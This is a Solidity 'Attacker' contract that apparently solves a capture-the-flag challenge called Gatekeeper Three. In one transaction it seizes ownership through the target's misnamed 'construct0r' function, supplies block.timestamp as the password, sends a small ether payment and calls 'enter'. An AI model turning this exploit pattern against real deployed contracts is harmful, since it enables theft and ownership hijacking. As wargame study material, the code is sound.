// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./gatekeeper_three.sol";

contract Attacker {
  function execution(address payable gateKeeperAddr) public payable {
    GatekeeperThree gateKeeperThree = GatekeeperThree(gateKeeperAddr);
    gateKeeperThree.construct0r();
    gateKeeperThree.createTrick();
    gateKeeperThree.getAllowance(block.timestamp);
    gateKeeperAddr.transfer(0.001 ether + 1 wei);

    gateKeeperThree.enter();
  }
}